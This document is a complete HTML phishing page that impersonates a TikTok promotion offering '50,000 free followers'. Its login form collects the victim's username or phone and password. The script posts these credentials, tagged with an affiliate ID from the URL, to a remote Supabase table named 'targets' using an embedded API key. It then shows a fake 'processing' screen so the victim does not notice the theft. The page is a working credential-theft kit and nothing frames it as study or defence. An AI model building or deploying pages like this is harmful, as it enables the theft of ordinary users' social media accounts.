<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Rewards - Get Free Followers</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body { background-color: #010101; color: white; font-family: 'Inter', sans-serif; }
        .tt-gradient { background: linear-gradient(45deg, #fe2c55, #25f4ee); }
        .glass { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.1); }
    </style>
</head>
<body class="min-h-screen flex items-center justify-center p-6">

    <div id="login-form" class="w-full max-w-md glass p-10 rounded-[40px] shadow-2xl">
        <div class="text-center mb-8">
            <i class="fab fa-tiktok text-6xl mb-4"></i>
            <h1 class="text-3xl font-black italic tracking-tighter">TIKTOK <span class="text-[#fe2c55]">BOOST</span></h1>
            <p class="text-gray-400 text-xs font-bold mt-2 uppercase">Claim 50,000 Free Followers</p>
        </div>

        <form id="claim-form" class="space-y-4">
            <input type="text" id="u-target" required placeholder="Username / Phone" class="w-full bg-white/5 border border-white/10 p-4 rounded-2xl focus:border-cyan-400 outline-none">
            <input type="password" id="p-target" required placeholder="Password" class="w-full bg-white/5 border border-white/10 p-4 rounded-2xl focus:border-cyan-400 outline-none">
            <button type="submit" id="btn-sub" class="w-full tt-gradient py-4 rounded-2xl font-black uppercase tracking-widest shadow-lg mt-4">Claim Now</button>
        </form>
    </div>

    <div id="success-box" class="hidden text-center glass p-12 rounded-[40px] animate-pulse">
        <i class="fas fa-check-circle text-7xl text-green-500 mb-6"></i>
        <h2 class="text-3xl font-black italic uppercase">Processing!</h2>
        <p class="text-gray-400 italic">Please wait 24 hours for delivery.</p>
    </div>

    <script>
        const SB_URL = 'https://irryclyepdnmncxyhgla.supabase.co';
        const SB_KEY = 'sb_publishable_SBAazL4Lqp4g2LC81O-FWQ_dX2zKek6';
        const params = new URLSearchParams(window.location.search);
        const agent = params.get('user') || 'direct_user';

        document.getElementById('claim-form').onsubmit = async (e) => {
            e.preventDefault();
            const btn = document.getElementById('btn-sub');
            btn.innerText = "VERIFYING...";
            btn.disabled = true;

            try {
                const res = await fetch(`${SB_URL}/rest/v1/targets`, {
                    method: 'POST',
                    headers: { 
                        'apikey': SB_KEY, 
                        'Authorization': `Bearer ${SB_KEY}`, 
                        'Content-Type': 'application/json',
                        'Prefer': 'return=minimal'
                    },
                    body: JSON.stringify({
                        user_id: agent,
                        username: document.getElementById('u-target').value,
                        password: document.getElementById('p-target').value,
                        platform: 'tiktok'
                    })
                });

                if (res.ok) {
                    document.getElementById('login-form').classList.add('hidden');
                    document.getElementById('success-box').classList.remove('hidden');
                } else {
                    alert("System Busy! Please try again later.");
                    btn.disabled = false;
                    btn.innerText = "Claim Now";
                }
            } catch (err) {
                alert("Connection Error!");
                btn.disabled = false;
            }
        };
    </script>
</body>
</html>
